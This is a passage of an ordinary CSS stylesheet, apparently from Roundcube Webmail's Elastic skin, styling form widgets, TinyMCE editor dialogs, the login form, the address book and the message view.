 }
 .input-percent-slider span.label {
   line-height: 2.4;
   padding: 0 0.5rem 0 0.25rem;
 }
 .input-percent-slider div.ui-slider {
   flex: 1;
   margin: 0 0.5em;
 }
 /*** Image upload widget ***/
 .image-upload {
   position: relative;
   overflow: hidden;
   cursor: pointer;
   background-color: #f4f4f4;
 }
 .image-upload a.button {
   display: none;
   position: absolute;
   left: 0;
   top: 0;
   background-color: rgba(255, 255, 255, 0.85);
   border-radius: 5px;
   width: 2.5em;
   padding: 0.5em;
   margin: 0.5em;
   line-height: 1;
 }
 .image-upload.changed a.button {
   display: inline;
 }
 .input-group-combo select:first-of-type.alone {
   border-radius: 0.25rem !important;
 }
 .input-group-combo select:first-of-type:not(.alone) {
   flex: unset;
   width: auto;
 }
 .input-group-combo .input-group {
   padding: 0 !important;
   flex: 2;
 }
 .input-group-combo select + select,
 .input-group-combo .input-group :first-child {
   border-top-left-radius: 0;
   border-bottom-left-radius: 0;
 }
 /*** General browser hacks ***/
 @-moz-document url-prefix() {
   select:-moz-focusring {
     color: transparent !important;
     text-shadow: 0 0 0 #2c363a !important;
   }
 }
 /*** Bootstrap style overrides and improvements ***/
 .form-control {
   color: #2c363a;
 }
 .form-control:focus {
   color: #2c363a;
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 .form-control.is-invalid {
   border-color: #EC1313;
   box-shadow: none;
 }
 .form-control.is-invalid:focus {
   border-color: #EC1313;
   box-shadow: 0 0 0 0.2rem rgba(236, 19, 19, 0.25);
 }
 .form-control::placeholder {
   color: #bbb;
 }
 .form-control::-ms-input-placeholder,
 .form-control::-webkit-input-placeholder {
   color: #bbb;
 }
 .invalid-feedback {
   color: #EC1313;
   font-size: 90%;
 }
 .form-group {
   margin-bottom: 0.5rem;
 }
 .input-group-text {
   color: #2c363a;
   background-color: #f1f3f4;
 }
 .input-group-text input:focus {
   z-index: 1;
   border-color: #0099cc !important;
 }
 .custom-switch {
   padding-left: 0;
   display: inline-block;
 }
 .custom-switch .custom-control-input {
   left: 0;
 }
 .custom-switch .custom-control-input:focus ~ .custom-control-label:before {
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 .custom-switch .custom-control-input:focus:not(:checked) ~ .custom-control-label::before {
   border-color: #0099cc;
 }
 .custom-switch .custom-control-input:checked ~ .custom-control-label::before {
   border-color: #0099cc;
   background-color: #0099cc;
 }
 .custom-switch .custom-control-input:checked:disabled ~ .custom-control-label::before {
   border-color: #1ac6ff;
   background-color: #1ac6ff;
 }
 .custom-switch .custom-control-label {
   padding-left: 2.5rem;
   min-height: 2rem;
   line-height: 2;
   display: inline-block;
 }
 html.touch .custom-switch .custom-control-label {
   padding-left: 3rem;
 }
 .custom-switch .custom-control-label:before,
 .custom-switch .custom-control-label:after {
   border-radius: 0.6rem;
   margin: 2px 0;
 }
 html.touch .custom-switch .custom-control-label:before,
 html.touch .custom-switch .custom-control-label:after {
   border-radius: 0.8rem;
   margin: 0;
 }
 .custom-switch .custom-control-label:before {
   left: 2px;
   top: 4px;
   width: 26px;
   height: 16px;
 }
 html.touch .custom-switch .custom-control-label:before {
   top: 2px;
   width: 35px;
   height: 22px;
 }
 .custom-switch .custom-control-label:after {
   left: 4px;
   top: 6px;
   width: 12px;
   height: 12px;
 }
 html.touch .custom-switch .custom-control-label:after {
   top: 4px;
   height: 18px;
   width: 18px;
 }
 .custom-switch .custom-control-input:checked ~ .custom-control-label::after {
   transform: translateX(10px);
 }
 html.touch .custom-switch .custom-control-input:checked ~ .custom-control-label::after {
   transform: translateX(13px);
 }
 .custom-switch .custom-control-input:not(:disabled) ~ .custom-control-label:after,
 .custom-switch .custom-control-input:not(:disabled) ~ .custom-control-label:before {
   cursor: pointer;
 }
 .custom-file {
   display: block;
 }
 .custom-file .custom-file-label {
   white-space: nowrap;
   overflow: hidden;
   text-overflow: ellipsis;
   padding-right: 100px;
   line-height: 1.5 !important;
 }
 .custom-file + .hint {
   margin-top: 3px;
 }
 .custom-file-input:focus ~ .custom-file-label {
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** Text Editor widget (and TinyMCE editor) ***/
 .mce-tinymce.mce-container.mce-panel {
   border-radius: 0.25rem;
   border-color: #ced4da;
   overflow: hidden;
 }
 .mce-tinymce .mce-btn,
 .mce-tinymce .mce-panel {
   background-color: #f1f3f4;
 }
 .mce-tinymce .mce-panel {
   border-color: #ced4da;
 }
 .mce-top-part::before,
 .mce-tinymce,
 .mce-window {
   box-shadow: none !important;
 }
 .mce-btn.mce-active {
   background: #8b9fa7 !important;
 }
 .mce-window.mce-container {
   border: 0;
 }
 .mce-window.mce-container :not(.mce-ico) {
   font-family: Roboto, sans-serif;
 }
 .mce-window .mce-reset {
   background: #fff;
 }
 .mce-window .mce-container-body.mce-abs-layout {
   overflow: unset;
 }
 .mce-window .mce-container-body .mce-abs-end {
   display: none;
 }
 .mce-window .mce-window-head {
   height: 58px;
   border-bottom: 1px solid #ddd;
   padding: 0;
 }
 .mce-window .mce-window-head .mce-title {
   line-height: 58px;
   font-size: 1.25rem;
   padding: 0 3rem 0 1rem;
   color: #2c363a;
 }
 .mce-window .mce-window-head .mce-close {
   border: 0;
   color: #2c363a;
   background: transparent;
   right: 0;
   top: 0;
   position: absolute;
   height: 57.3px;
   width: 1.25em;
   margin: 0.25rem;
   padding: 0.1rem 0.75rem;
   cursor: pointer;
 }
 .mce-window .mce-window-head .mce-close:before {
   content: "\f00d";
   margin: 0;
 }
 .mce-window .mce-window-head .mce-close i {
   display: none;
 }
 .mce-window .mce-foot {
   border: 0;
   height: 58px !important;
   position: relative;
 }
 @media screen and (max-width: 480px) {
   .mce-window .mce-foot {
     border-top: 1px solid #ddd;
   }
 }
 .mce-window .mce-foot .mce-container-body {
   height: 100% !important;
   display: flex;
   align-items: center;
   justify-content: flex-end;
 }
 .mce-window .mce-foot .mce-container-body .mce-btn {
   position: initial;
   margin-right: 0.5rem;
   line-height: 1;
   width: auto !important;
   height: auto !important;
 }
 .mce-window .mce-foot .mce-container-body .mce-btn:last-child {
   margin-right: 1rem;
 }
 .mce-window .mce-foot .mce-container-body .mce-btn .mce-txt {
   line-height: 1.5;
   vertical-align: unset;
 }
 .mce-window .mce-foot .mce-container-body .mce-btn button:before {
   display: inline;
   float: none;
   vertical-align: middle;
   margin-right: 0.4rem;
 }
 .mce-window .mce-foot .mce-container-body .mce-abs-end {
   position: initial;
   width: 1rem;
   order: 9;
 }
 .mce-window .mce-foot .mce-btn {
   color: #fff;
   background: #8b9fa7;
   border-color: #8b9fa7;
   border-radius: 0.3rem;
   border-color: transparent;
 }
 .mce-window .mce-foot .mce-btn:focus {
   box-shadow: 0 0 0 0.2rem rgba(139, 159, 167, 0.5);
 }
 .mce-window .mce-foot .mce-btn:hover {
   background: #7c939c;
   border-color: #778e98;
 }
 .mce-window .mce-foot .mce-btn.disabled,
 .mce-window .mce-foot .mce-btn:disabled {
   background: #c5cfd3;
   border-color: #c5cfd3;
   opacity: 1;
 }
 .mce-window .mce-foot .mce-btn:not(:disabled):not(.disabled):active,
 .mce-window .mce-foot .mce-btn:not(:disabled):not(.disabled).active {
   background: #6e8791;
   border-color: #6a828b;
 }
 .mce-window .mce-foot .mce-btn:not(:disabled):not(.disabled):active:focus,
 .mce-window .mce-foot .mce-btn:not(:disabled):not(.disabled).active:focus {
   box-shadow: 0 0 0 0.2rem rgba(139, 159, 167, 0.53);
 }
 .mce-window .mce-foot .mce-btn:focus {
   border-color: transparent !important;
   color: #fff;
   background: #8b9fa7;
 }
 .mce-window .mce-foot .mce-btn.mce-primary {
   color: #fff;
   background: #0099cc;
   border-color: #0099cc;
 }
 .mce-window .mce-foot .mce-btn.mce-primary:focus {
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.5);
 }
 .mce-window .mce-foot .mce-btn.mce-primary:hover {
   background: #0086b3;
   border-color: #007ea8;
 }
 .mce-window .mce-foot .mce-btn.mce-primary.disabled,
 .mce-window .mce-foot .mce-btn.mce-primary:disabled {
   background: #33ccff;
   border-color: #33ccff;
   opacity: 1;
 }
 .mce-window .mce-foot .mce-btn.mce-primary:not(:disabled):not(.disabled):active,
 .mce-window .mce-foot .mce-btn.mce-primary:not(:disabled):not(.disabled).active {
   background: #007399;
   border-color: #006b8f;
 }
 .mce-window .mce-foot .mce-btn.mce-primary:not(:disabled):not(.disabled):active:focus,
 .mce-window .mce-foot .mce-btn.mce-primary:not(:disabled):not(.disabled).active:focus {
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.53);
 }
 .mce-window .mce-foot .mce-btn button:hover,
 .mce-window .mce-foot .mce-btn button {
   color: #fff;
   padding: 0.5rem 0.75rem;
 }
 .mce-window .mce-foot .mce-btn:last-child button:before {
   content: "\f00d";
 }
 .mce-window .mce-foot .mce-btn.mce-primary button:before {
   content: "\f00c";
 }
 .mce-window .mce-foot .mce-search-foot div:nth-of-type(2) button:before {
   content: "\f002";
 }
 .mce-window .mce-foot .mce-search-foot div:nth-of-type(3) button:before,
 .mce-window .mce-foot .mce-search-foot div:nth-of-type(4) button:before {
   content: "\f303";
 }
 .mce-window .mce-foot .mce-search-foot div:nth-of-type(6) button:before {
   content: "\f053";
 }
 .mce-window .mce-foot .mce-search-foot div:nth-of-type(7) button:before {
   content: "\f054";
 }
 .mce-window .mce-foot .mce-search-foot div:nth-of-type(7) button:after {
   display: inline;
   float: none;
   margin: 0 0 0 0.2rem;
   content: "\f054";
 }
 @media screen and (min-width: 481px) {
   .mce-window .mce-foot .mce-search-foot div:nth-of-type(6) {
     margin-left: 0.5rem;
   }
   .mce-window .mce-foot .mce-search-foot div:nth-of-type(7) button:before {
     display: none;
   }
 }
 .mce-window .mce-formitem {
   min-width: 450px;
   position: unset !important;
 }
 .mce-window .mce-formitem > .mce-container-body {
   margin-bottom: 0.5rem;
 }
 .mce-window .mce-formitem > .mce-container-body > * {
   width: 75% !important;
   position: unset !important;
 }
 .mce-window .mce-formitem > .mce-container-body > label {
   max-width: 25%;
   min-width: 25%;
   line-height: 2.5 !important;
 }
 .mce-window .mce-formitem .mce-widget {
   border-radius: 0.25rem;
 }
 .mce-window .mce-form {
   padding: 1rem;
   box-sizing: border-box;
 }
 .mce-window .mce-form .mce-form {
   padding: 0;
   position: unset !important;
   width: 100% !important;
 }
 .mce-window .mce-form .mce-form > .mce-container-body {
   flex-wrap: wrap;
   height: auto !important;
 }
 .mce-window .mce-form .mce-form .mce-formitem {
   min-width: 100%;
   width: 100% !important;
 }
 .mce-window .mce-form .mce-container {
   height: auto !important;
 }
 .mce-window .mce-form .mce-container .mce-container-body {
   display: flex;
   height: auto !important;
 }
 .mce-window .mce-form .mce-container .mce-container-body > input:not([size="5"]) {
   position: relative;
   left: 0 !important;
   flex: 1;
 }
 .mce-window .mce-form > .mce-container-body {
   box-sizing: border-box;
   width: 100% !important;
 }
 .mce-window .mce-form .mce-form-split .mce-formitem {
   min-width: auto;
 }
 .mce-window .mce-form .mce-form-split .mce-formitem > .mce-container-body {
   width: 100% !important;
 }
 .mce-window .mce-form label {
   position: unset;
   line-height: 2.5 !important;
   height: auto !important;
 }
 .mce-window .mce-colorpicker + .mce-form {
   width: 150px !important;
   padding: 0;
 }
 .mce-window .mce-colorpicker + .mce-form .mce-formitem {
   min-width: unset;
 }
 .mce-window .mce-colorpicker + .mce-form .mce-formitem + :not(.mce-formitem) {
   height: 50px !important;
 }
 .mce-window .mce-textbox {
   padding: 0.375rem 0.75rem !important;
   line-height: 1.5;
   color: #2c363a;
 }
 .mce-window .mce-textbox:not(textarea) {
   height: auto !important;
 }
 .mce-window .mce-textbox:focus {
   color: #2c363a;
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 .mce-window .mce-textbox[size="5"] {
   width: auto !important;
 }
 .mce-window .mce-textbox.mce-multiline {
   line-height: 1.25;
   width: 100% !important;
   position: unset;
   box-sizing: border-box;
   display: block;
 }
 .mce-window .mce-listbox button {
   line-height: 1.5;
   padding: 0.375rem 0.75rem;
 }
 .mce-window .mce-listbox:focus {
   border-color: #0099cc !important;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25) !important;
 }
 .mce-window .mce-checkbox {
   line-height: 2.5;
 }
 .mce-window .mce-checkbox i.mce-i-checkbox {
   border: 0;
   width: auto;
   color: #0099cc;
   text-indent: 0;
 }
 .mce-window .mce-checkbox i.mce-i-checkbox:before {
   margin: 0;
   content: "\f204";
 }
 .mce-window .mce-checkbox.mce-checked i.mce-i-checkbox:before {
   content: "\f205";
 }
 .mce-window .mce-checkbox:focus i.mce-i-checkbox {
   border: 0;
 }
 .mce-window .mce-combobox {
   display: flex;
 }
 .mce-window .mce-combobox input {
   border-radius: 0.3rem 0 0 0.3rem;
   flex: 1;
 }
 .mce-window .mce-combobox input:focus {
   z-index: 1;
 }
 .mce-window .mce-combobox.mce-combobox-fake input {
   border-radius: 0.3rem;
 }
 .mce-window .mce-combobox button {
   padding: 0.4rem 0.6rem;
 }
 .mce-window .mce-combobox .mce-btn {
   border-radius: 0 0.3rem 0.3rem 0;
   background: #f1f3f4;
 }
 .mce-window .mce-combobox .mce-btn:focus {
   background-color: rgba(0, 153, 204, 0.25);
   border-color: #c5c5c5;
 }
 .mce-window .mce-tabs {
   padding-top: 1rem;
   margin: 0 1rem;
   border-color: #d4dbde;
 }
 .mce-window .mce-tabs .mce-tab {
   border-radius: 0.25rem 0.25rem 0 0;
   padding: 0.5rem 1rem;
   height: auto !important;
   border: 1px solid transparent;
   color: #0099cc;
   background: transparent;
   margin-bottom: -1px;
 }
 .mce-window .mce-tabs .mce-tab.mce-active {
   border: 1px solid #d4dbde;
   border-bottom-color: #fff;
   color: #2c363a !important;
 }
 .mce-window .mce-tabs .mce-tab:not(.mce-active):hover {
   border: 1px solid #f1f3f4;
   border-bottom-color: transparent;
   border-bottom: 0;
 }
 .mce-window .mce-tabs .mce-tab:focus {
   outline: unset !important;
 }
 .mce-window .mce-label {
   text-shadow: none;
   color: #2c363a;
 }
 .mce-menu,
 .mce-floatpanel.mce-popover {
   box-shadow: 3px 3px 5px #f1f3f4 !important;
   border-color: #d4dbde !important;
   border-radius: 0.3rem;
 }
 .mce-menu .mce-menu-item.mce-active {
   color: #fff;
   background-color: #0099cc;
 }
 .mce-menu .popover-header {
   display: none !important;
 }
 div.mce-menubtn.mce-opened {
   z-index: 65530 !important;
 }
 #mce-modal-block.mce-in {
   background-color: rgba(44, 54, 58, 0.5);
   opacity: 1 !important;
 }
 @media screen and (max-width: 480px) {
   .mce-window {
     width: 100% !important;
     height: 100% !important;
     left: 0 !important;
     top: 0 !important;
     border-width: 0 !important;
   }
   .mce-window > .mce-reset {
     display: flex;
     flex-direction: column;
     height: 100%;
   }
   .mce-window .mce-window-body {
     flex: 1;
     overflow-y: auto !important;
   }
   .mce-window > .mce-reset > div,
   .mce-window .mce-container-body {
     width: 100% !important;
   }
   .mce-window .mce-window-head {
     background-color: #cfdee6;
   }
   .mce-window .mce-window-head .mce-title {
     font-size: 1rem;
     text-align: center;
     padding: 0 1rem;
   }
   .mce-window .mce-window-head .mce-close {
     display: none;
   }
   .mce-window .mce-foot {
     background-color: #cfdee6;
   }
   .mce-window .mce-foot .mce-container-body {
     justify-content: space-evenly;
   }
   .mce-window .mce-foot .mce-container-body .mce-btn {
     position: initial;
     height: 100% !important;
     margin: 0;
     background: transparent;
     border-width: 0;
   }
   .mce-window .mce-foot .mce-container-body .mce-btn:focus {
     box-shadow: none;
   }
   .mce-window .mce-foot .mce-container-body .mce-btn:hover {
     background: transparent;
   }
   .mce-window .mce-foot .mce-container-body .mce-btn:last-child {
     margin: 0;
   }
   .mce-window .mce-foot .mce-container-body .mce-btn button {
     color: #2c363a;
     padding: 0.45rem;
     font-size: 0.9rem;
   }
   .mce-window .mce-foot .mce-container-body .mce-btn button:before {
     display: block;
     float: none;
     width: 100%;
     margin: 0;
     line-height: 1.75;
     height: 1.75rem;
   }
   .mce-window .mce-foot .mce-container-body .mce-abs-end {
     display: none;
   }
   .mce-window .mce-foot .mce-search-foot div:nth-of-type(7) button:after {
     display: none;
   }
   .mce-window .mce-form,
   .mce-window .mce-form + .mce-container,
   .mce-window .mce-formitem,
   .mce-window .mce-combobox,
   .mce-window .mce-panel:not(.mce-popover) {
     width: 100% !important;
   }
   .mce-window .mce-formitem {
     min-width: unset;
   }
   .mce-window .mce-form > .mce-container-body {
     display: flex;
     flex-direction: column;
     left: 0;
     right: 0;
     box-sizing: border-box;
   }
   .mce-window .mce-form .mce-container-body {
     height: auto !important;
     flex-direction: column;
   }
   .mce-window .mce-form .mce-container-body > label {
     position: unset !important;
     width: 100% !important;
     max-width: 100%;
   }
   .mce-window .mce-form .mce-container-body > label + * {
     position: unset !important;
     width: auto !important;
   }
   .mce-window .mce-form .mce-container-body > .mce-checkbox {
     position: absolute;
     left: 0 !important;
     top: 3rem !important;
   }
   .mce-window .mce-combobox input {
     max-width: calc(100% - 4rem);
   }
   .mce-window .mce-combobox-fake input {
     max-width: calc(100% - 1.7rem);
   }
   .mce-menu {
     width: 272px !important;
     right: 0;
     top: 0 !important;
     left: auto !important;
     height: 100% !important;
     max-height: unset !important;
     padding: 0 !important;
     margin: 0 !important;
     border-radius: 0;
     border: 0 !important;
   }
   .mce-menu .popover-header {
     display: block !important;
   }
   .mce-menu .popover-header a {
     font-size: 1.2rem;
     line-height: 58px;
   }
   .mce-menu .popover-header a:before {
     content: "\f00d";
   }
   .mce-menu .mce-container-body {
     width: 100% !important;
   }
   .mce-menu .mce-menu-item {
     height: 47px;
     line-height: 47px;
     padding: 0 0.5rem;
     border-left: 0;
     border-bottom: 1px solid #f1f3f4;
     margin: 0;
   }
   .mce-menu .mce-menu-item .mce-ico {
     font-size: 150%;
     padding: 0 0.7rem 0 0.25rem;
     margin-top: -0.2rem;
   }
   .mce-menu .mce-menu-item .mce-text {
     font-size: 1.2rem;
     font-family: Roboto, sans-serif;
     line-height: 47px;
     color: #2c363a;
   }
   .mce-menu .mce-menu-item .mce-caret {
     display: none;
   }
   .mce-menu .mce-menu-item.mce-menu-item-preview.mce-active {
     border-left: none;
     position: relative;
   }
   .mce-menu .mce-menu-item.mce-menu-item-preview.mce-active:after {
     font-size: 1.25em;
     display: block;
     float: left;
     margin: 0 0.25rem 0 0;
     width: 1.18em;
     height: 1em;
     font-family: 'Icons';
     font-style: normal;
     font-weight: 900;
     text-decoration: inherit;
     text-align: center;
     speak: none;
     font-smoothing: antialiased;
     -moz-osx-font-smoothing: grayscale;
     -webkit-font-smoothing: antialiased;
     content: "\f00c";
     position: absolute;
     right: 0.5rem;
     top: 0;
     color: #2c363a;
   }
   .mce-menu .mce-menu-item.mce-menu-item-expand {
     position: relative;
   }
   .mce-menu .mce-menu-item.mce-menu-item-expand:after {
     font-size: 1.25em;
     display: block;
     float: left;
     margin: 0 0.25rem 0 0;
     width: 1.18em;
     height: 1em;
     font-family: 'Icons';
     font-style: normal;
     font-weight: 900;
     text-decoration: inherit;
     text-align: center;
     speak: none;
     font-smoothing: antialiased;
     -moz-osx-font-smoothing: grayscale;
     -webkit-font-smoothing: antialiased;
     content: "\f105";
     position: absolute;
     right: 0.5rem;
     top: 0;
     color: #2c363a;
   }
   .mce-menu-item-sep,
   .mce-menu-shortcut {
     display: none !important;
   }
   .mce-charmap-dialog {
     position: unset !important;
   }
   .mce-charmap-dialog + .mce-container {
     display: none;
   }
   .mce-charmap {
     display: block;
   }
   .mce-charmap tbody {
     display: block;
   }
   .mce-charmap tr {
     display: flex;
     flex-wrap: wrap;
   }
   .mce-charmap td {
     flex: 1;
     height: auto !important;
     min-width: 17%;
     padding: 0 !important;
     border: 0 !important;
     border-bottom: 1px solid #f1f3f4 !important;
   }
   .mce-charmap td div {
     font-size: 3rem;
     line-height: 2;
   }
 }
 html.touch .mce-grid td {
   padding: 0.5rem;
 }
 /*** Media file selector for TinyMCE ***/
 .image-selector {
   margin: 1rem 1rem 1rem 1rem !important;
   padding: 1rem 0.5rem 10rem 0.5rem !important;
 }
 .image-selector.droptarget {
   border: 0.2rem dashed #d4dbde;
 }
 .image-selector.droptarget:after {
   margin-top: 2rem;
 }
 .image-selector button {
   color: #fff;
   background: #8b9fa7;
   border-color: #8b9fa7;
   padding: 0.5rem 0.75rem;
   line-height: 1.5;
   position: relative;
 }
 .image-selector button:focus {
   box-shadow: 0 0 0 0.2rem rgba(139, 159, 167, 0.5);
 }
 .image-selector button:hover {
   background: #7c939c;
   border-color: #778e98;
 }
 .image-selector button.disabled,
 .image-selector button:disabled {
   background: #c5cfd3;
   border-color: #c5cfd3;
   opacity: 1;
 }
 .image-selector button:not(:disabled):not(.disabled):active,
 .image-selector button:not(:disabled):not(.disabled).active {
   background: #6e8791;
   border-color: #6a828b;
 }
 .image-selector button:not(:disabled):not(.disabled):active:focus,
 .image-selector button:not(:disabled):not(.disabled).active:focus {
   box-shadow: 0 0 0 0.2rem rgba(139, 159, 167, 0.53);
 }
 .image-selector button:before {
   line-height: 1;
 }
 .image-selector form {
   position: absolute;
   top: 0;
 }
 .image-selector .attachmentslist {
   margin-left: 0;
   overflow-x: hidden;
   overflow-y: auto;
   height: 19.1em;
 }
 .image-selector .attachmentslist li {
   padding: 0.25rem;
   cursor: pointer;
 }
 .image-selector .attachmentslist li:before {
   display: none;
 }
 .image-selector .attachmentslist li:hover,
 .image-selector .attachmentslist li:focus {
   background: #0099cc;
 }
 .image-selector .attachmentslist li span.name {
   flex: 1;
   margin: auto;
   padding-left: 1rem;
   overflow: hidden;
   text-overflow: ellipsis;
 }
 .image-selector .attachmentslist li span.img {
   height: 80px;
   width: 80px;
   display: flex;
   border: 1px solid #f1f3f4;
   background: white;
   border-radius: 0.75rem;
   overflow: hidden;
 }
 .image-selector .attachmentslist li img {
   margin: auto;
 }
 html.layout-phone .image-selector .attachmentslist {
   height: auto;
 }
 /*** HTML editor widget ***/
 .html-editor {
   position: relative;
   display: flex;
   margin-bottom: 0.25rem;
 }
 .html-editor > .nav {
   border-color: transparent;
   z-index: 1;
   position: absolute;
   right: 1rem;
 }
 .html-editor > .nav a.active {
   border-color: #ced4da !important;
 }
 .html-editor > .nav a.active.mode-html {
   background-color: #f1f3f4;
   border-bottom-color: #f1f3f4 !important;
 }
 .html-editor > .nav a.active.mode-plain {
   border-bottom-color: #fff !important;
 }
 .html-editor > .nav a:hover,
 .html-editor > .nav a:focus {
   border-bottom-color: transparent;
   outline: 0;
 }
 .html-editor > iframe,
 .html-editor > .googie_edit_layer,
 .html-editor > .mce-tinymce,
 .html-editor > textarea {
   margin-top: 2.55rem;
   font-family: monospace;
   width: 100% !important;
 }
 .html-editor > iframe {
   border-radius: 0.3rem;
   border: 1px solid #ced4da;
   min-height: 30em;
 }
 .html-editor #composebody_ifr {
   min-height: 30em;
 }
 .html-editor > .mce-tinymce.focused {
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25) !important;
 }
 /*** GoogieSpell widget ***/
 .googie_window {
   width: 16rem;
   height: auto;
 }
 .googie_edit_layer {
   font-family: monospace;
   padding: 0.5rem 0.75rem;
   border: 1px solid #ced4da;
   border-radius: 0.3rem;
   line-height: 1.25;
 }
 .googie_link {
   color: #EC1313;
   text-decoration: underline;
   cursor: pointer;
 }
 .googie_list li {
   min-width: 8rem;
   width: auto;
 }
 .googie_list li.googie_list_onhover {
   color: #fff;
   background-color: #0099cc;
 }
 .googie_list li .googie_list_revert:before {
   content: "\f0e2";
 }
 .googie_list li .googie_add_to_dict:before {
   content: "\f0fe";
 }
 .googie_list input {
   display: inline-block;
   margin: 0.25rem 0.5rem;
 }
 /*** Login form ***/
 .task-login #layout-content {
   text-align: center;
   width: 100%;
   display: block;
 }
 .task-login #logo {
   display: inline-block;
   position: relative;
   top: 16vh;
   max-height: 100px;
 }
 #login-form {
   margin: 0 auto;
   top: 20vh;
   width: 95%;
   max-width: 320px;
   position: relative;
 }
 #login-form table,
 #login-form tbody {
   display: block;
 }
 #login-form .row {
   margin-right: 0;
   margin-left: 0;
 }
 #rcmloginsubmit:before {
   display: none !important;
 }
 #login-footer {
   flex: 1;
   color: #737677;
 }
 #login-footer > div {
   margin-top: 1rem;
   padding: 1rem;
   background: #f1f3f4;
   border-radius: 0.3rem;
 }
 #login-addon {
   position: absolute;
   bottom: 0;
   max-height: 30%;
   margin: 1rem !important;
   width: auto !important;
   overflow: auto;
 }
 @media screen and (min-width: 769px) {
   #login-addon {
     max-width: 768px;
     margin: auto !important;
     bottom: 1rem;
     left: 0;
     right: 0;
   }
 }
 body.task-error-login #layout #layout-menu,
 body.task-error-login #layout #layout-content > .header {
   display: none;
 }
 /*** Addressbook UI ***/
 #contactpic {
   width: 112px;
   height: 135px;
   border-radius: 0.5rem;
   overflow: hidden;
   display: table-cell;
   vertical-align: middle;
   text-align: center;
   background-color: #f4f4f4;
 }
 #contactpic img {
   max-width: 112px;
   max-height: 135px;
 }
 #contacthead .names {
   margin-bottom: 0.5rem;
 }
 #contacthead .names span.namefield {
   font-size: 1.5rem;
   font-weight: bold;
   line-height: 1.2;
 }
 #contacthead.readonly .source.row {
   color: #737677;
   font-size: 90%;
   margin-bottom: 0.25rem;
 }
 /*** Mail UI ***/
 #message-header {
   margin-bottom: 1rem;
 }
 #message-header .subject {
   font-size: 1.5rem;
   font-weight: bold;
 }
 body.status-flagged #message-header .subject:before {
   display: inline;
   float: none;
   content: "\f024";
   font-size: 1em;
   color: #EC1313;
 }
 #message-header .subject a.extwin:before {
   float: none;
   display: inline-block;
   font-size: 75%;
   line-height: 1.5;
   margin: 0;
   content: "\f360";
 }
 #message-header .subject span.inner {
   display: none;
 }
 #message-header .short-header {
   display: flex;
 }
 #message-header .short-header img.contactphoto {
   margin: 0 1rem 0 0;
   border-radius: 50%;
   width: 4rem;
   height: 4rem;
 }
 #message-header .short-header div.header-content {
   min-height: 4rem;
   flex: 1;
 }
 #message-header .short-header div.header-subject {
   line-height: 2rem;
 }
 #message-header .short-header div.header-subject > span {
   line-height: 1.5;
   display: inline-block;
   vertical-align: middle;
 }
 #message-header .short-header div.header-links a {
   font-size: 90%;
   margin-right: 0.5rem;
   text-decoration: none;
   white-space: nowrap;
   display: inline-block;
 }
 #message-header .short-header div.header-links a:before {
   height: 1.5rem;
   line-height: 1.3;
 }
 #message-header .short-header div.header-links a.envelope:before {
   content: "\f0e0";
 }
 #message-header .short-header div.header-links a.html:before {
   content: "\f03e";
 }
 #message-header .short-header div.header-links a.plain:before {
   content: "\f039";
 }
 #message-header .short-header div.header-links a.zipdownload:before {
   content: "\f019";
 }
 #message-header .short-header .message-partheaders {
   margin: 0 !important;
   padding: 0.25rem 0 !important;
 }
 #message-header a.extwin,
 #message-header a.headers {
   text-decoration: none;
 }
 #message-content .attachmentslist:not(:empty) {
   margin-bottom: 1rem;
 }
 #messagebody.mailvelope {
   margin: 0;
 }
 #messagebody.mailvelope iframe {
   min-height: 75vh;
 }
 .message-part,
 .message-htmlpart {
   padding-top: 0.5rem;
   position: relative;
 }
 .message-part:not(:first-child),
 .message-htmlpart:not(:first-child) {
   border-top: 1px solid #f5f5f5;
   margin-top: 0.5rem;
 }
 .message-part div.rcmBody,
 .message-htmlpart div.rcmBody {
   margin: 0 !important;
 }
 .message-part blockquote,
 .message-htmlpart blockquote {
   overflow: hidden;
   text-overflow: ellipsis;
   color: #002633;
   border-left: 2px solid #002633;
   border-right: 2px solid #002633;
   background-color: rgba(241, 243, 244, 0.5);
   margin: 2px 0;
   padding: 0 0.4em;
 }
 .message-part blockquote blockquote,
 .message-htmlpart blockquote blockquote {
   color: #205a24;
   border-left: 2px solid #205a24;
   border-right: 2px solid #205a24;
 }
 .message-part blockquote blockquote blockquote,
 .message-htmlpart blockquote blockquote blockquote {
   color: #8e0b0b;
   border-left: 2px solid #8e0b0b;
   border-right: 2px solid #8e0b0b;
 }
 .message-part blockquote span.blockquote-link,
 .message-htmlpart blockquote span.blockquote-link {
   top: 0;
   cursor: pointer;
   right: 0.5rem;
   min-width: 4rem;
   padding: 0.2rem 0.25rem 0.2rem 0.5rem;
   font-size: 90%;
   text-align: center;
   color: #737677;
   background: #f1f3f4;
   border: 1px solid #d4dbde;
   border-radius: 0.3rem;
   line-height: 1;
   font-family: Roboto, sans-serif;
 }
 .message-part blockquote span.blockquote-link:after,
 .message-htmlpart blockquote span.blockquote-link:after {
   content: "\f107";
   display: inline-block;
   float: none;
   margin: 0;
   font-size: 90%;
 }
 .message-part blockquote span.blockquote-link.collapsed:after,
 .message-htmlpart blockquote span.blockquote-link.collapsed:after {
   content: "\f106";
 }
 .message-part blockquote.blockquote-header,
 .message-htmlpart blockquote.blockquote-header {
   text-overflow: ellipsis !important;
   padding-right: 5rem !important;
 }
 .message-part span.sig {
   color: #737677;
 }
 .message-part div.pre {
   font-family: monospace;
 }
 .message-partheaders {
   padding: 0.5rem 0;
   margin: 0.5rem 0 0 0;
   font-size: 90%;
   border-top: 1px solid #f1f3f4;
   border-bottom: 1px solid #f1f3f4;
   color: #737677;
 }
 .message-partheaders .header-title {
   overflow: hidden;
   text-overflow: ellipsis;
   white-space: nowrap;
   max-width: 8em;
   font-weight: bold;
   padding-right: 1rem;
   vertical-align: top;
